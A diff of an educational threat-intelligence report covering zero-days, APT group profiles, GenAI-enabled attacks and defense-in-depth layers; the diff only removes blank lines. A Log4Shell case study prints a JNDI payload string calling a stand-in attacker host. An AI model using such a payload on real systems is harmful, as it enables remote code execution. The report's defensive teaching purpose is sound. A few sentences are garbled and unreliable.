@@ -2,15 +2,11 @@
 
 This introductory section will establish the basic concepts necessary to understand the detailed actor profiles that follow. It will define what an APT means in the modern context and address the confusing landscape of threat actor naming conventions, which is a key challenge for practitioners.
 
-
 Section: The Predator-Prey Relationship on the Web
-
 
 Whether it is a commercial or non-profit enterprise, it seems logical for every business to understand that building a secure organization is crucial for long-term success. When a business implements and maintains a strong security posture, it can enjoy numerous advantages. A secure organization can use its security program as a marketing tool, demonstrating to its customers how much it values their business and the extent of its commitment to protecting their information. Most importantly, however, a secure organization will not have to spend time and money detecting security breaches and responding to the consequences of those breaches.
 
-
 [Image: No image description]
-
 
 Information Security
 
@@ -24,9 +20,7 @@ When word gets out (and there will be) that there is a new exploitable vulnerabi
 
 The fact that many vulnerabilities in your network can be caused by your employees makes your job even more difficult. Casual browsing of porn sites can expose the network to all kinds of nasty bugs and malicious code just by an employee visiting the site. The problem is, for users this may not seem like that big of a deal. They either don't realize or don't care that they're leaving the network open to intrusions.
 
-
 Section: Protocols and Code Flaws
-
 
 Let's take a closer look at the barriers that make building a secure organization difficult.
 
@@ -34,99 +28,73 @@ Security is inherently troublesome, and the more robust the security mechanisms,
 
 To fully understand the frustration caused by security measures, we only need to observe the Transportation Security Administration (TSA) security lines at any airport. Simply watch the frustration when a specific item is run through the scanner for a third time while a passenger is late to board their flight. Security implementations rely on a sliding scale; one end of the scale represents total security and complete inconvenience, while the other end represents total insecurity and complete ease of use. When we implement any security mechanism, it must be placed on the scale where the level of security and ease of use matches the acceptable level of risk for the organization.
 
-
 Section: Powerful and Complex Computers
-
 
 Home computers have become repositories of personal data. Our computers now contain wedding videos, scanned family photos, music libraries, movie collections, and financial and health information. Because computers contain such familiar information and have integrated deeply into daily life, we have forgotten how powerful and complex these devices actually are. Not too long ago, computers as powerful as our current desktops and laptops would fill one or more large rooms. Additionally, today's computers present a 'user-friendly' interface to the world.
 
-
 [Image: No image description]
-
 
 The ENIAC Computer
 
 Most people do not know how computers actually work and what goes on behind the scenes. Elements such as the Windows Registry, ports, and services are completely unknown to most users and are not sufficiently understood by many computer professionals. For example, many people still believe that a Windows login password protects the data on the computer. On the contrary, someone can extract the hard drive from the computer, plug it into another computer as a secondary drive, or place it in a USB drive enclosure, and all the data will be easily accessible.
 
-
 Section: Uninformed Computer Users
-
 
 Many computer users believe they 'know everything about computers' simply because they are skilled at creating spreadsheets (like Excel), word processing documents (like Word), and presentations (like PowerPoint)—in short, using office productivity applications.
 
 These 'Power Users' have progressed beyond application basics, yet many of them still do not understand even fundamental security concepts. Many users will casually install software and visit suspicious websites, despite the fact that these actions may violate company policies. The 'bad guys'—individuals who want to steal information from or cause damage to computer systems—have also identified that the end user is a weak link in the security chain.
 
-
 [Image: No image description]
-
 
 End User Risk
 
 As companies invest more money in their perimeter defenses, attackers have begun to seek the path of least resistance. They send malicious software as email attachments, asking recipients to open them. Despite being instructed not to open attachments from unknown senders—or simply not to open attachments at all—employees repeatedly violate this policy, causing havoc on their networks.
 
-
 [Image: No image description]
-
 
 Phishing
 
 Phishing scams have been highly effective in convincing individuals to hand over personal online banking and credit card information. Why should an attacker struggle to bypass an organization's defenses when end users are all too willing to hand over the keys to their accounts? Addressing the threat posed by untrained and careless end users is a crucial part of any security program.
 
-
 Section: Computers Built Without Security in Mind
 
-
 During the development of personal computers (PCs), security was never a consideration. The earliest PCs were very simple devices with limited processing power, no keyboards, and programmed by flipping a series of switches. They were developed almost as novelty items. Even as they became more advanced and complex, all efforts focused on increasing capabilities and functionality; no one anticipated that security issues would arise. To understand why security was not a concern back then, we only need to look at some of the early computers, such as Berkeley Enterprises' Geniac, Heathkit EC-1, or the MITS Altair 8800. The development of computers was focused on what they could do, not how they could be attacked!
-
 
 [Image: ENIAC computer, 1945: the first programmable computer designed with no security in mind]
 
 ENIAC (1945) — the first electronic programmable computer was designed without any security consideration; this legacy is the structural root of modern system vulnerabilities.
 
-
 [Image: No image description]
-
 
 MITS Altair 8800—The First Personal Computer
 
 When computers began to connect with one another, the primary goal was not to protect information, but to provide the ability to share it. The internet was initially designed for military applications, but it eventually moved to colleges and universities, where the core principle was information sharing.
 
-
 Section: The Current Trend is Sharing, Not Protecting
-
 
 Even now, despite stories of compromised data, people still want to share their data with everyone. Web-based applications make this easier than attaching a file to an email. Social networking platforms like Meta provide the capability to share materials: 'Send messages, files, links, and events to your friends. Build a network of friends and share things. Free and easy.'
 
 In addition, many online data storage sites, such as DropSend and FilesAnywhere, facilitate file sharing. These sites can allow private data to leave an organization by bypassing security mechanisms.
 
-
 Section: Data Accessible From Everywhere
-
 
 As if employees' desire to share data did not pose enough of a threat to private information, many business professionals want to access data from wherever they are working, using a variety of devices. To remain productive, employees now demand access to data and communication details on their laptops, desktops, home computers, and mobile devices. Consequently, information technology (IT) departments must now provide the ability to sync data across numerous devices. If the IT department cannot or will not provide this capability, employees have the power to take matters into their own hands.
 
 The online storage sites mentioned previously can be accessed from home, the office, or anywhere with an internet connection. While it is possible to block access to some of these sites, blocking all of them is virtually impossible. Some may appear quite harmless. For many, Google's free email service, Gmail, is an excellent tool that offers robust service at no cost. Few realize that Gmail provides storage space that can be used not just for email, but also for storing files. Today, the risk is compounded by Shadow IT: employees upload sensitive corporate data into personal ChatGPT/LLM accounts without corporate oversight; uncontrolled OneDrive and Google Drive shares move corporate data beyond the company's visibility; and unsanctioned SaaS integrations create pathways for inadvertent data leakage. The ease with which data can be transferred outside of a company's control makes securing an organization's data far more challenging.
 
-
 [Image: Official network vs. Shadow IT pathways: unauthorized cloud, personal devices, shadow apps]
 
 Official corporate network vs. Shadow IT (Shadow IT) pathways — uncontrolled channels are the leading source of data leakage.
 
-
 Section: Security is Not About Hardware and Software
-
 
 Many businesses believe that if they purchase enough equipment, they can build a secure infrastructure. Firewalls, intrusion detection systems, antivirus software, and two-factor authentication products are just a few of the tools that help protect a network and its data. It is important to bear in mind that no single product or combination of products will create a secure organization on its own. Security is a process; there is no tool that you can 'set and forget.' All security products are only as secure as the people who configure and maintain them. The purchase and implementation of security products should only represent a percentage of the security budget. Employees tasked with maintaining security devices must be provided with sufficient time, training, and equipment to properly support the products. Unfortunately, in many organizations, security activities fall behind support activities. Highly skilled security professionals are often assigned to helpdesk projects, such as resetting forgotten passwords, fixing jammed printers, and setting up workstations for new employees.
 
-
 Section: Management Views Security as a Burden on Profitability
-
 
 For most organizations, the cost of establishing a strong security posture is viewed as a necessary evil, similar to purchasing insurance. Organizations do not want to spend money on it, but the risks of not doing so outweigh the costs. Because of this attitude, building a secure organization is extremely difficult. This mindset arises because requests for security tools are usually supported by documentation showing the average cost of a security incident, rather than demonstrating the more tangible benefits of a strong security posture.
 
-
 [Image: No image description]
-
 
 The Cost of Breaches
 
@@ -144,9 +112,7 @@ The goal of any discussion with management is to convince them that having a sec
 
 The unchecked complexity of modern computers and enterprise software inevitably leaves behind exploitable code errors. When these errors are weaponized into "Zero-Day" vulnerabilities, a relentless race against time begins for every actor in the digital ecosystem.
 
-
 Section: N-Days and the Zero-Day Paradox
-
 
 <div style="background: rgba(59, 130, 246, 0.05); border-left: 4px solid #3b82f6; padding: 15px; margin: 20px 0; border-radius: 6px;">
 <strong style="color: #3b82f6; font-size: 1.1em;">🔍 Case Study: CVE-2021-44228 (Log4Shell)</strong>
@@ -155,7 +121,6 @@ Section: N-Days and the Zero-Day Paradox
 <strong>Impact:</strong> One of the most critical vulnerabilities in internet history. It allowed attackers to execute remote code with full privileges by simply sending a single log string (e.g. <code>${jndi:ldap://attacker.com/a}</code>). It is the ultimate example of the danger of the Zero-Day window.
 </p>
 </div>
-
 
 [Image: Log4Shell CVE-2021-44228: technical breakdown of the Apache Log4j JNDI vulnerability]
 
@@ -169,17 +134,13 @@ Vulnerability generally refers to a vulnerability that exists in a system, netwo
 
 Zero-Day Attacks are attacks that exploit yet undiscovered or unreported vulnerabilities in the software or hardware components of the computer system. These vulnerabilities and vulnerabilities are exploited by attackers as soon as they are detected, causing the attacked party to be caught off guard.
 
-
 [Image: No image description]
-
 
 So why are they defenseless? No matter how much attention the organization pays to its vulnerability management processes, it cannot manage a security vulnerability that it is not aware of. The working logic of many products used for vulnerability management is aimed at detecting and eliminating known vulnerabilities. Therefore, it is not possible to fix a vulnerability that has not yet been discovered.
 
 The process of eliminating newly discovered vulnerabilities takes some time. If the provider of the platform where the vulnerability was discovered issues a patch, a certain amount of time is required until the institution closes the vulnerability by making the necessary updates with this patch. During this time, the institution becomes vulnerable to this vulnerability.
 
-
 [Image: No image description]
-
 
 As soon as the vulnerability is published, the attackers take action, leaving institutions vulnerable. They detect institutions with vulnerable platforms through platforms such as Shodan and try to carry out their attacks before the vulnerability is corrected.
 
@@ -193,9 +154,7 @@ So, will institutions really be defenseless against these attacks? Will he wait 
 
 Chapter: Know Your Enemy: Anatomy and Motivations of Threat Actors
 
-
 A Network Attack is an unauthorized entry into a computer in your organization or an address within your assigned domain. Intrusion can be passive (infiltration stealthily and undetected) or active (in which changes to network resources are affected). Intrusions can come from outside or inside your network structure (an employee, customer or business partner). Some intrusions are just to let you know that the intruder is there, defacing your website with various messages or vulgar images. Others are more malicious, attempting to obtain critical information on a one-off basis or as an ongoing parasitic affair that will continue to siphon data until discovered. Some intruders attempt to inject elaborate code to crack passwords, record keystrokes, or impersonate your site to redirect unsuspecting users to their site. Others embed themselves in the network and constantly silently extract data or replace public Web pages with various messages.
-
 
 [Image: Threat actor categories: individuals, criminal organizations, hacktivists, and nation states]
 
@@ -238,9 +197,7 @@ Packet inconsistencies–direction (incoming or outgoing), source address or loc
 
 Sometimes strange or unexpected system behavior is a sign in itself. Although this is sometimes difficult to keep track of, you should be aware of events such as changes in system clocks, servers shutting down or server processes inexplicably stopping (via attempts to restart the system), system resource issues (such as unusually high CPU activity or overflows in file systems), audit logs behaving in strange ways (reducing in size without administrative intervention), or unexpected user access to resources. Heavy system usage (possible DoS attack) or CPU usage (brute force password cracking attempts) should always be investigated if you notice unusual activity at regular times on certain days.
 
-
 Section: Terminology Confusion: Hackers vs. Crackers
-
 
 <div style="background: rgba(245, 158, 11, 0.05); border-left: 4px solid #f59e0b; padding: 15px; margin: 20px 0; border-radius: 6px;">
 <strong style="color: #f59e0b; font-size: 1.1em;">⚖️ Comparison Card: Hacker vs. Cracker</strong>
@@ -287,14 +244,11 @@ Cracker wants to act like a cyber-ninja, sneaking up and infiltrating your netwo
 
 [Mermaid Diagram: An architectural or flow diagram is present here. Diagram details are visually represented.]
 
-
 Section: From Script Kiddies to Professional "Cybercrime Corporations"
-
 
 Once, a hacker was typically depicted as a lone teenager with poor social skills, breaking into systems for little more than bragging rights. However, as e-commerce evolved, the profile of hackers changed as well.
 
 Now that there are vast collections of credit card numbers and intellectual property to harvest, organized hacker groups have formed to operate as businesses. Today, cybercrime organizations operate with the sophistication of legitimate corporations: groups like FIN7, Scattered Spider, and Lazarus Group maintain hierarchical structures complete with HR functions, technical divisions, and even customer support units for ransomware victims. Forget about individual hackers or hacker groups with shared goals. What you and your company need to worry about are hierarchical cybercrime organizations, where each cybercriminal has their own role and reward system.
-
 
 [Image: WannaCry attack chain: endpoint compromise, exploit, rapid propagation, ransom]
 
@@ -302,12 +256,9 @@ WannaCry ransomware attack flow — from unpatched EternalBlue vulnerability to 
 
 In an era where organizations are attacked by highly motivated and skilled hacker groups, building a secure infrastructure has become imperative.
 
-
 Section: The Botnet Epidemic and Zombie Computers
 
-
 A new and particularly virulent threat that has emerged in the last few years is one in which a virus is secretly implanted into a large number of unprotected computers (usually those located in homes), hijacking them (without their owners' knowledge) and turning them into slaves to do the hacker's bidding. These compromised computers, known as bots, connect to large and often untraceable networks called botnets. Botnets are designed to work so that instructions come from a central computer and are quickly shared among other botted computers on the network. Newer botnets now use a "peer-to-peer" method, making detection difficult, if not impossible, by law enforcement because they lack a central identifiable control point. And because they often cross international borders into countries that lack the means (or will) to investigate and shut them down, they can grow at an alarming rate. They can be so lucrative that they have now become a tool of choice for hackers.
-
 
 [Image: Botnet C&C architecture: zombie computers, C2 server, and bot master]
 
@@ -319,9 +270,7 @@ It's such a widespread problem that botnet attacks rose from an estimated 300,00
 
 Bot controllers operate networks that need a large and untraceable means of sending out large amounts of advertising, but who want to build their own network.They can also make money by renting it to others who do not have the financial or technical resources. To make matters worse, botnet technology can be found online for less than $100, making it relatively easy to start what could be a very lucrative business.
 
-
 Section: The Pinnacle: What is an Advanced Persistent Threat (APT)?
-
 
 <div style="background: rgba(239, 68, 68, 0.05); border-left: 4px solid #ef4444; padding: 15px; margin: 20px 0; border-radius: 6px;">
 <strong style="color: #ef4444; font-size: 1.1em;">⚠️ Critical Threat Card: CVE-2017-0144 (EternalBlue)</strong>
@@ -350,7 +299,6 @@ While understanding the motivations of these cybercriminals and state-sponsored 
 
 Chapter: The "Tower of Babel" Problem in Global Threat Intelligence and the Art of Naming
 
-
 The "Tower of Babel" Problem: This subsection will explain why a universal naming standard for threat actors is impractical and may not be possible. Because different security vendors (Microsoft, CrowdStrike, Mandiant, Kaspersky, Palo Alto Networks, etc.) have their own telemetry, visibility, and internal research priorities, they develop unique naming schemes. This creates a "Rosetta Stone" problem for defenders who must correlate intelligence from multiple sources.
 Provider Taxonomies: The high-level logic of the major provider naming schemes will be introduced to provide a mental model for the aliases the reader will encounter.
 Microsoft: Uses a weather-themed taxonomy. Family names such as "Blizzard" (Russia), "Typhoon" (China), "Sandstorm" (Iran) and "Sleet" (North Korea) indicate nation-state origins, while "Tempest" indicates financially motivated actors. Newly discovered activities are indicated by "Storm" and a numerical code.
@@ -362,9 +310,7 @@ Industry Collaboration: Note will highlight the recent strategic alliance betwee
 
 The existence of different and complex naming schemes directly reflects the structure of the cybersecurity industry: a competitive market of private organizations, each with private data. While this fragmentation is a rich and diverse source of intelligence, it inherently creates an operational burden on defenders who must synthesize these disparate streams. The challenge for a Security Operations Center (SOC) analyst is not just technical (detecting the threat) but alsois analytical (correlating intelligence about the threat). The primary value of this report is to serve as a tool to fill this analytical gap.
 
-
 [Image: No image description]
-
 
 Threat Actor Taxonomy Rosetta Stone
 
@@ -376,18 +322,13 @@ This table acts as a "Rosetta Stone," providing a means of resolving name confli
 
 Chapter: APT Groups on the Geographical and Geopolitical Axis (In-Depth Analysis)
 
-
 This section explores the details and implications.
-
 
 Section: Russia-Linked Actors: High Sabotage and Intelligence Integration
 
-
 This section will detail the threat actors attributed to the Russian Federation, which is known for its sophisticated espionage, disruptive capabilities, and integrated "information conflict" doctrines.
 
-
 Section: APT28 (Fancy Bear / Forest Blizzard)
-
 
 Aliases: An extensive list including Fancy Bear (CrowdStrike), Forest Blizzard, STRONTIUM (Microsoft), Sofacy (Kaspersky), Sednit (ESET), Pawn Storm (Trend Micro), IRON TWILIGHT (Secureworks), Tsar Team, Group 74, APT 28, G0007 and more.
 Attribution and Motivation: Attributed with high confidence to the Main Intelligence Directorate (GRU) of the Russian General Staff, specifically unit 26165. Their motivation is primarily military and political espionage and is aligned with the interests of the Russian government. They do not appear to engage in widespread intellectual property theft for economic gain.
@@ -397,9 +338,7 @@ Notable Campaigns: The takeover of the Democratic National Committee (DNC) in 20
 Initial Access: They rely heavily on spear-phishing attacks containing malicious links or attachments, harvesting credentials through fake websites, and exploiting public-facing applications, especially email servers and routers.
 Post-Exfiltration: They use a mixture of proprietary malware such as X-Agent, Zebrocy, Sofacy and public tools such as Mimikatz, Cobalt Strike. A key TTP is their use of "hacktivist" identities such as Guccifer 2.0 and "Fancy Bears' Hack Team" to leak stolen data and further their information operations, giving them plausible deniability.
 
-
 Section: APT29 (Cozy Bear / Midnight Blizzard)
-
 
 <div style="background: rgba(245, 158, 11, 0.05); border-left: 4px solid #f59e0b; padding: 15px; margin: 20px 0; border-radius: 6px;">
 <strong style="color: #f59e0b; font-size: 1.1em;">🔒 Supply Chain Analysis: CVE-2020-10148 (SolarWinds Orion Bypass)</strong>
@@ -417,19 +356,15 @@ Notable Campaigns: 2015–2016 DNC infiltration (conducted separately from APT28
 Initial Access: They use a wide variety of initial access vectors, including sophisticated spear phishing, supply chain intrusions (SolarWinds), and identity-based attacks such as password spraying against cloud services.
 Post-Infiltration: They are known for their special "Duke" family malware (MiniDuke, CozyDuke, etc.). PowerShell and me to evade detectionThey make extensive use of "living off the land" techniques by using legitimate cloud management tools. A key TTP is their misuse of OAuth implementations and stolen tokens for persistence and lateral movement in cloud environments.
 
-
 [Image: C2 attack server: encrypted command flow reaches infected host through firewall]
 
 Command and Control (C2) server — the attacker manages the victim remotely across the firewall.
-
 
 [Image: SolarWinds supply chain attack: March–December 2020 timeline]
 
 SolarWinds SUNBURST operation — the 12-step anatomy of a supply chain attack (Vectra, 2020).
 
-
 Section: Sandworm (APT44 / Seashell Blizzard)
-
 
 Nicknames: APT44 (Mandiant), Seashell Blizzard (Microsoft), VOODOO BEAR, IRON VIKING, Telebots.
 Attribution and Motivation: Attributed to Military Unit 74455 of the GRU. Sandworm is a dynamic and mature actor active in the full spectrum of espionage, attack and influence operations. Their main motivation is to support Russia's military and political objectives, especially through disruptive and destructive attacks.
@@ -438,9 +373,7 @@ Operational Summary and TTPs: Responsible for some of the most significant cyber
 Notable Campaigns: 2015 and 2016 Ukrainian power grid attacks, 2017 global NotPetya attack, and sabotage of the 2018 Pyeongchang Olympics. They are currently conducting a high-intensity cyber sabotage campaign in Ukraine using wiper malware.
 TTPs: They leverage a wide range of initial access vectors, from exploiting end infrastructure such as routers and VPNs to supply chain infiltrations. They are known for distributing destructive wiper malware and have recently been associated with hacktivist identities such as "CyberArmyofRussia\_Reborn" to exfiltrate data and claim responsibility for attacks on critical infrastructure in the US and Europe.
 
-
 Section: Gamaredon (Primitive Bear / Aqua Blizzard)
-
 
 Nicknames: Primitive Bear (CrowdStrike), Aqua Blizzard (Microsoft), Armageddon, Shuckworm.
 Attribution and Motivation: Attributed to the Russian Federal Security Service (FSB). Their main motivation is cyber espionage.
@@ -451,15 +384,11 @@ The GRU/SVR operational dichotomy is evident in the observed TTPs and targeting 
 
 Additionally, Russian-linked actors tend to use e-crime infrastructure and actors for state goals. This provides plausible deniability and allows access to a broader pool of tools and resources. For example, DanaBot malware operated by Russia-based e-crime group SCULLY SPIDER has been used to launch DDoS attacks against the Ukrainian Ministry of Defense in concert with Russian military targets. The DOJ indictment revealed that DanaBot subbotnets were also used for espionage purposes, a feature of government activities. This implies a strategy within Russia's "information conflict" doctrine that deliberately blurs the lines between state and criminal activity, complicating attribution and intervention for Western nations.
 
-
 Section: China-Linked Actors: Industrial Espionage and Infrastructure Intrusions
-
 
 This section will detail the threat actors generally attributed to the People's Republic of China, which is characterized by large-scale intellectual property theft, broad-spectrum espionage, and increasing operational sophistication.
 
-
 Section: APT1 & APT10 (Stone Panda / Comment Crew / Red Apollo)
-
 
 Pseudonyms: Comment Crew, Shanghai Group, PLA Unit 61398.
 Attribution and Motivation: Attributed to People's Liberation Army (PLA) Unit 61398. Basic motivation, economic gain and intellectualIt is cyber espionage for property theft.
@@ -471,18 +400,14 @@ Attribution and Motivation: Attributed to China's Ministry of State Security (MS
 Target Profile: The "Cloud Hopper" campaign targets multiple industries globally, including healthcare, defense, aerospace, and managed service providers (MSP).
 Operational Summary and TTPs: Known for supply chain attacks targeting MSPs to gain access to their customers. It uses a mixture of specialized malware such as HAYMAKER, SNUGRIDE, and legitimate tools such as PowerShell, WMIExec.
 
-
 Section: APT41 (Winnti / Brass Typhoon)
-
 
 Nicknames: BARIUM, WICKED PANDA, Winnti Group, Double Dragon (CrowdStrike/Mandiant), Brass Typhoon (Microsoft).
 Attribution and Motivation: Believed to be Chinese state-sponsored contractors who also conduct financially motivated operations, possibly with the tacit approval of government officials. This creates a unique dual-purpose espionage and cybercrime motivation.
 Target Profile: Espionage campaigns target the healthcare, telecommunications and high-tech sectors. Cybercrime attacks focus on the video game industry (manipulating virtual currencies) and ransomware distribution.
 Operational Summary and TTPs: It is a prolific and sophisticated actor that has been active since at least 2012. They are known for using a large arsenal of more than 46 different malware families, including backdoors, rootkits, and credential thieves. They often rely on spear phishing attacks involving compiled HTML (.chm) files for initial access.
 
-
 Section: Other Important China-Linked Groups
-
 
 APT3 (Gothic Panda / Brocade Typhoon): Targets aviation, defense and technology.
 APT18 (Dynamite Panda / Wekby): Affiliated with the PLA Navy, targets healthcare, pharmaceuticals and biotechnology.
@@ -494,15 +419,11 @@ APT41's profile reveals a key trend in Chinese cyber operations: the use of stat
 
 Additionally, the targeting patterns of Chinese APTs are not random; It is strictly aligned with China's national strategic goals, such as the Belt and Road Initiative (APT40) and 5-year economic plans (APT41's intellectual property theft). This demonstrates a direct link between geopolitical/economic policy and cyber operations. This means that organizations can do proactive threat modeling by analyzing China's publicly available strategic documents. If a company operates in an industry identified as a priority for China's development, it is a possible target for a China-related APT.
 
-
 Section: Iran-Linked Actors: Social Engineering and Cyber Sabotage
-
 
 This section will cover threat actors attributed to Iran who are notable for their heavy reliance on social engineering, targeting dissidents, and use of a mix of espionage and subversive operations.
 
-
 Section: APT33 (Elfin) & APT34 (OilRig)
-
 
 Nicknames: Elfin, Magnallium (Mandiant), HOLMIUM, Peach Sandstorm (Microsoft), Refined Kitten (Crowd)Strike).
 Attribution and Motivation: A suspected Iranian government-backed group active since at least 2013. Their motivations include cyber espionage and preparing for potentially disruptive operations against critical infrastructure.
@@ -518,9 +439,7 @@ Operational Summary and TTPs: They are known for using PowerShell-based tools an
 Campaigns: The 2016 Helminth backdoor campaign and the 2018 QUADAGENT distribution are notable examples. They often conduct supply chain attacks by taking over a less secure organization to achieve their primary goal.
 Malware: They use special backdoors such as Helminth and QUADAGENT. A leak in 2019 revealed a significant portion of the toolsets.
 
-
 Section: APT35/APT42 (Charming Kitten / Mint Sandstorm)
-
 
 Nicknames: Charming Kitten, Phosphorus, Magic Hound (CrowdStrike), Mint Sandstorm (Microsoft), Agent Serpens (Palo Alto), Newscaster Team, TA453.
 Attribution and Motivation: Attributed to the Iranian Revolutionary Guard Corps (IRGC). Their main motivation is surveillance and information gathering against individuals and organizations of strategic importance to the Iranian government, especially dissidents and enemies of the regime.
@@ -530,15 +449,11 @@ Techniques: They conduct long-term, resource-intensive social engineering campai
 
 Iranian APTs, unlike the more technically focused Russian and Chinese groups, demonstrate a mastery and intense dependence on sophisticated and long-term social engineering. They compensate for not using zero-day vulnerabilities by investing in psychological manipulation. Multiple sources indicate that Charming Kitten's (APT35/42) core TTP is to establish trust and rapport over long periods of time before an attack. This differs from the more direct spear phishing or vulnerability exploitation seen from other state actors. This shows that Iran's cyber doctrine gives priority to human intelligence (HUMINT) techniques adapted to the digital domain. For advocates, this simply means that technical controls such as email filtering are inadequate. A strong defense requires solid user security awareness training and processes for authenticating unknown individuals, no matter how plausible they may seem.
 
-
 Section: North Korea-Linked Actors: Financial Warfare via Cyber Army
-
 
 This chapter will analyze threat actors attributed to the Democratic People's Republic of Korea (DPRK), which has the unique mission of carrying out a combination of state-sponsored espionage and large-scale financial crimes to generate revenue for the regime.
 
-
 Section: Lazarus Group (Diamond Sleet / APT38) & Kimsuky (Emerald Sleet / APT43)
-
 
 Aliases: Diamond Sleet, ZINC (Microsoft), HIDDEN COBRA (US Government), Guardians ofPeace, APT38 (Mandiant, for financial operations).
 Attribution and Motivation: A North Korean state-sponsored group attributed to the Reconnaissance General Bureau (RGB). They have the dual motivation of traditional espionage and financially motivated attacks, including cryptocurrency theft and bank robberies, to generate illicit revenue in violation of international sanctions.
@@ -553,30 +468,22 @@ Target Profile: Primarily targets government organizations, think tanks, journal
 Operational Summary and TTPs: Active since at least 2012.
 Techniques: They are masters of social engineering and spear phishing, posing as journalists or academics to establish relationships before sending malicious links or attachments. They use specialized malware like BabyShark and leverage legitimate tools like PowerShell and VBScript for execution and persistence. They are known to use malicious browser extensions and exploit misconfigured DMARC policies to advance phishing campaigns.
 
-
 Section: Other Notable North Korea-Linked Groups
-
 
 APT45 (Andariel / Onyx Sleet): A moderately sophisticated operator, also related to RGB, active since 2009. They conduct espionage against defense and government, but have expanded into financially motivated operations, including the questionable use of MAUI ransomware against hospitals.
 
 North Korea's cyber operations represent the clearest convergence of state espionage with large-scale criminal enterprise. Unlike cases in other nations where e-crime is tolerated or used opportunistically, for the DPRK it is a key pillar of its national strategy to circumvent sanctions and finance its state and military and nuclear programs. The Lazarus Group is clearly associated with major financial heists such as the Bangladesh Bank robbery and numerous cryptocurrency thefts worth hundreds of millions of dollars. The US government and security firms directly state that these activities are intended to generate illegal revenue for the regime. This is not just a "crime"; It is a key component of state-directed financial warfare and foreign policies. This means that any organization in the financial or cryptocurrency sectors is a direct target of a North Korean state actor, not only for espionage but also for outright theft.
 
-
 Section: Other Major Threat Actors
-
 
 This section will briefly discuss other important state-sponsored and financially motivated groups mentioned in the research material to present a more complete global picture.
 
-
 Section: Vietnam Link: APT32 (OceanLotus)
-
 
 Nicknames: OceanLotus, Canvas Cyclone (Microsoft).
 Operational Summary: A Vietnamese state-sponsored group focused on cyber espionage against foreign companies, foreign governments, and political opponents with interests in Vietnam's manufacturing, consumer goods, and hospitality sectors.
 
-
 Section: Financially Motivated Actexamples (e-Crime)
-
 
 FIN7: A sophisticated and prolific e-crime group known for stealing payment card data by targeting point-of-sale (POS) systems in the restaurant, gaming and hospitality industries.
 SCATTERED SPIDER (Octo Tempest): A highly skilled e-crime group known for social engineering attacks targeting IT help desks to gain initial access to large companies, particularly in the telecommunications and BPO sectors.
@@ -589,25 +496,19 @@ TTPs used by financially motivated groups such as FIN7 and SCATTERED SPIDER are 
 
 Chapter: Shared Weapon of Modern Threats: The GenAI Threat
 
-
 The rapid adoption of Generative AI (GenAI) technologies has provided threat actors with powerful automation and payload optimization capabilities.
-
 
 [Image: Deepfake use cases: election manipulation, identity theft, financial fraud, social engineering]
 
 GenAI-powered deepfakes — the new frontier of social engineering.
 
-
 Section: Adversarial Adaptation of GenAI
-
 
 Threat actors leverage Large Language Models (LLMs) to enhance their technical capabilities:
 Polymorphic Malware: Attackers use LLMs to write and refactor payloads, enabling code mutation to bypass signature-based antivirus and EDR solutions.
 Rapid Exploit Generation: As soon as a new CVE (vulnerability) is announced, threat actors use AI to analyze vulnerability descriptions and build functional exploit prototypes within hours.
 
-
 Section: The Era of Flawless Spear-Phishing
-
 
 In the past, phishing emails were easily identifiable by poor grammar, awkward phrasing, and translation errors. With GenAI:
 Threat actors generate highly professional, grammatically perfect spear-phishing emails in the target's native language.
@@ -622,12 +523,9 @@ In the face of this AI-powered automation — flawless phishing emails and polym
 
 Chapter: Defense-in-Depth Architecture for Modern Enterprises
 
-
 Most security experts agree that perfect network security is impossible and that any defenses can always be bypassed. The defense-in-depth strategy embraces blocking the attacker with multiple layers of defense. He acknowledges that each layer can be overcome. Valuable assets are protected by more layers of defense. The combination of multiple layers increases the cost of success of the attack, which is proportional to the value of the assets protected. Additionally, the combination of multiple layers is more effective than a single optimized defense against unexpected attacks. The cost to the attacker may come in the form of additional time, effort, or equipment. For example, an attacker's delay can increase an organization's chances of detecting and responding to the attack in progress. If the increased costs outweigh the gains from a successful attack, some attempts may be discouraged.
 
-
 [Image: No image description]
-
 
 Defense In Depth
 
@@ -635,9 +533,7 @@ Defense in depth is sometimes said to involve people, technology and operations.
 
 Various technological measures can be used for protection layers. These include firewalls, IDSs, access control lists (ACLs), antivirus software, access control, spam filters, etc. should take place.
 
-
 [Image: No image description]
-
 
 Defense in Depth
 
@@ -649,9 +545,7 @@ However, there is one more thing we need to mention before that. The tactics and
 
 My scenario covers the detection and prevention of a zero-day vulnerability discovered in a particular service of an organization and an attack that exploits this vulnerability. Of course, one of the most critical among the discovered vulnerabilities; Let's consider the detection and prevention of an attack that exploits a zero-day vulnerability that occurs in an open service of the institution and allows remote access (RCE).
 
-
 [Image: No image description]
-
 
 Bank Network Topology
 
@@ -668,9 +562,7 @@ There is a SIEM that brings it all together.
 
 [Mermaid Diagram: An architectural or flow diagram is present here. Diagram details are visually represented.]
 
-
 Section: Layer 1: Application Protection - Outer Perimeter
-
 
 Most computer users are aware that Internet use poses security risks. It makes sense to take precautions to minimize exposure to attacks. Fortunately, several options are available for computer users to reduce risks by strengthening their systems.
 
@@ -694,9 +586,7 @@ Regular vulnerability scans are performed for the applications and services we u
 Application logs are collected and examined in the SIEM system to detect attacks on applications. (SOC).
 Applications are tried to be protected from attacks by being placed behind application firewalls. (WAF).
 
-
 [Image: No image description]
-
 
 Application Protection
 
@@ -704,9 +594,7 @@ Zero-day attacks can bypass this layer. Because vulnerability scans cannot detec
 
 In our scenario, exploiting the RCE vulnerability and gaining access to the target system means that this layer is breached. The initial access phase in Mitre has been successful. Unauthorized access has been achieved and we are not aware of it. However, let's add that the attacker has no gains yet. Still, the attacker seems to be ahead of us 1-0. However, we have 3 more defense lines behind us. Let's continue looking at these.
 
-
 Section: Layer 2: Endpoint Protection - Guardians of the Inner Castle
-
 
 [Mermaid Diagram: An architectural or flow diagram is present here. Diagram details are visually represented.]
 
@@ -764,9 +652,7 @@ privilege escalation(Privilege Escalation-Mitre) on the system it accesses. In o
 
 For methods of ensuring persistence in Windows-based systems, you can take a look at the relevant article.
 
-
 [Image: No image description]
-
 
 Endpoint Protection
 
@@ -795,14 +681,11 @@ A detailed examination of the endpoint for the 3 important things I mentioned ab
 
 Of course, this awareness is valid for institutions that have experts examining these products. Unfortunately, even if many organizations purchase such endpoint security products, they do not open them and look. Although security products detect and automatically block malware, they may not completely eliminate the attacker's access to the system. In this case, the attacker tries various methods to bypass or disable the security product, and if successful, can also bypass this layer.
 
-
 Section: Layer 3: Network Protection - Maze Control
-
 
